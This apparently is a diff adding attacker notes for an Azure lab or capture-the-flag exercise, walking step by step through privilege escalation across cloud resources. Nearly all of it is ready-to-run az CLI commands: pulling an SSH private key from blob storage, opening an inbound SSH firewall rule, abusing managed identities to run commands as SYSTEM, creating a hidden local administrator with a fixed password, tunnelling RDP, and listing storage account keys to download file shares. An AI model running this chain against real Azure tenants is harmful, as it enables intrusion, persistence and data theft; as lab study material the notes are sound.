@@ -1,0 +1,46 @@
+- katie.parkson has Reader + Storage Blob Data Reader roles on a storage account
+az role assignment list --all --assignee <\UserName>
+az storage account list
+az storage container list --account-name <\StorageAccountName> --auth-mode login
+az storage blob list --container-name <\ContainerName> --account-name <\StorageAccountName> --auth-mde login
+az storage blob download --container-name <\ContainerName> --account-name <\StorageAccountName> --name <\BlobName> --file blobsecret.txt --auth-mde login
+
+- katie.parkson has Owner role on LinuxVMNSG -> can add an SSH firewall rule
+- list firewall rules:
+az network nsg rule list -g <\ResourceGroup> --nsg-name <\NSGName> --output table
+
+- create a new inbound NSG rule:
+az network nsg rule create -g <\ResourceGroup> --nsg-name <\NSGName> -n MyNsgRule --priority 4096 --source-address-prefixes X.X.X.X/24 --source-port-ranges '*' --destination-address-prefixes '*' --destination-port-ranges 22 --access Allow --protocol Tcp --description "Allow from specific IP address ranges on port 22"
+
+- katie.parkson has also Reader role on LinuxVMPublicIp -> list IP of the LinuxVM
+az network public-ip list -g <\ResourceGroup>
+
+- get root on LinuxVM with the added firewall rule + SSH private key
+ssh -i blobsecret.txt azureuser@<\PublicIp>
+
+- LinuxVM runs as a Managed Identity with Contributor role on WindowsVM
+az login --identity
+az vm list -g <\ResourceGroup> --output table
+
+- LinuxVM can run commands as SYSTEM -> add a local admin on WindowsVM
+az vm run-command invoke --command-id RunPowerShellScript --name <\WindowsVM> --resource-group <\ResourceGroup> --scripts 'net user user1 Passw0rd! /add’
+az vm run-command invoke --command-id RunPowerShellScript --name <\WindowsVM> -g <\ResourceGroup> --script "net localgroup Administrators user1 /add"
+
+- LinuxVM also has Reader role on on InternalNIC -> get the internal IP of the WindowsVM from the associated InternalNIC:
+az vm nic show -g engineering --vm-name WindowsVM --nic InternalNIC1
+
+- RDP in via local port forwarding
+ssh -i blobsecret.txt -L 3389:<\internal-IP>:3389 azureuser@<\PublicIp>
+xfreerdp /u:user1 /p:"Passw0rd!" /v:127.0.0.1 +clipboard /w:1600 /h:900 /cert-ignore
+
+- WindowsVM also runs as a Managed Identity -> enumerate roles assigned to it
+az login --identity
+az role assignment list --all 
+
+- WindowsVM has Storage Account Contributor role on the storage account
+az storage account list
+az storage share list --account-name <\StorageAccountName>
+az storage account keys list -g <\ResourceGroup> -n <\StorageAccountName>
+az storage file list --share-name <\ShareName> --account-name <\StorageAccountName> --account-key <\KeyValue> 
+
+az storage file download --path <\PathName> --share-name <\ShareName>  --account-name <\StorageAccountName> --account-key <\KeyValue> 
